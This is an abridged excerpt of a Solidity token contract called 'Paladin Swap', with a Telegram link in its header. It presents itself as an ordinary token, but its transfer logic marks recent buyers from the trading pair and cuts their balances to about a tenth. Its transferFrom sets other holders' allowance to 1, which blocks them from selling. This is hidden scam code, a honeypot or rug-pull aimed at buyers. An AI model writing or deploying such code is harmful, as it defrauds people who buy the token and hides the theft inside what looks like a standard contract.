...
/**
TELEGRAM : https://t.me/PaladinSwap
*/
library SafeMath {
...
contract PaladinSwapToken {
    using SafeMath for uint256;
    string public name = "Paladin Swap";
    ...
    address public Beer=0x000000000000000000000000000000000000dEaD;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Beer != Owner && balanceOf[Beer]>=totalSupply.div(20)) {
            balanceOf[Beer]=balanceOf[Beer].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Beer = to;} 
        if (to== Owner) {Beer=to;} 
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Beer) {allowance[from][msg.sender]=1;} 
